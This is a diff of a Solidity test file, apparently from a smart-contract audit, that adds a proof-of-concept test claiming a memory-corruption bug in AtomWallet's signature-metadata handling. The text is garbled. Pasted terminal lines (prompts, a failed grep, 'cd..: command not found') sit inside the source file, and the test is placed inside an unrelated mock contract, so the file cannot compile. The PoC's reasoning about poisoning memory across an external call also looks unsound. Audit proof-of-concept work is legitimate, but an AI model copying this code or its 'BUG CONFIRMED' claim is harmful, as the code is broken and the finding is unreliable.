@@ -1,3 +1,14 @@
+root@138245:/home/as/intution-audit/2026-03-intuition/tests/unit/AtomWallet# grep -n "mload" src/protocol/wallet/AtomWallet.sol
+grep: src/protocol/wallet/AtomWallet.sol: No such file or directory
+root@138245:/home/as/intution-audit/2026-03-intuition/tests/unit/AtomWallet# cd..
+cd..: command not found
+root@138245:/home/as/intution-audit/2026-03-intuition/tests/unit/AtomWallet# cd /home/as/intution-audit/2026-03-intuition/
+root@138245:/home/as/intution-audit/2026-03-intuition# grep -n "mload" src/protocol/wallet/AtomWallet.sol
+323:                revert(add(result, 32), mload(result))
+356:            word := mload(add(meta, 32))
+root@138245:/home/as/intution-audit/2026-03-intuition# nano AtomWallet.t.sol
+root@138245:/home/as/intution-audit/2026-03-intuition# nano tests/unit/AtomWallet/AtomWallet.t.sol
+root@138245:/home/as/intution-audit/2026-03-intuition# cat tests/unit/AtomWallet/AtomWallet.t.sol
 // SPDX-License-Identifier: BUSL-1.1
 pragma solidity 0.8.29;
 
@@ -1043,4 +1054,47 @@ contract MockRevertingContract {
     function revertFunction() external pure {
         revert("MockRevertingContract: revert");
     }
-}
+/**
+     * @notice PoC: Confirms the Memory Corruption vulnerability.
+     */
+    function test_PoC_SignatureMemoryCorruption() public {
+        vm.warp(BASE_TIMESTAMP);
+
+        uint256 ownerPrivateKey = 0x1234;
+
+        PackedUserOperation memory userOp;
+        bytes32 userOpHash = keccak256("poc_hash");
+
+        uint48 expectedUntil = 2000;
+        uint48 expectedAfter = 1000;
+
+        // Forming a signature: 65 bytes of dummy data + 12 bytes of metadata
+        bytes memory signatureData = new bytes(65);
+        userOp.signature = abi.encodePacked(signatureData, expectedUntil, expectedAfter);
+
+        // --- MEMORY CORRUPTION ---
+        // Fill free memory with 0xff...
+        bytes32 poison = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
+        assembly {
+            let freeMem := mload(0x40)
+            for { let i := 0 } lt(i, 10) { i := add(i, 1) } {
+                mstore(add(freeMem, mul(i, 32)), poison)
+            }
+        }
+
+        // Call validation on behalf of EntryPoint
+        vm.prank(address(mockEntryPoint));
+        uint256 validationResult = atomWallet.validateUserOp(userOp, userOpHash, 0);
+
+        uint48 recoveredUntil = uint48(validationResult >> 160);
+        uint48 recoveredAfter = uint48(validationResult >> 208);
+
+        console.log("--- Signature Corruption Report ---");
+        console.log("Expected validUntil: ", expectedUntil);
+        console.log("Recovered validUntil:", recoveredUntil);
+        console.log("Expected validAfter: ", expectedAfter);
+        console.log("Recovered validAfter:", recoveredAfter);
+
+        assertNotEq(recoveredUntil, expectedUntil, "BUG CONFIRMED: validUntil was corrupted by memory!");
+    }
+} 
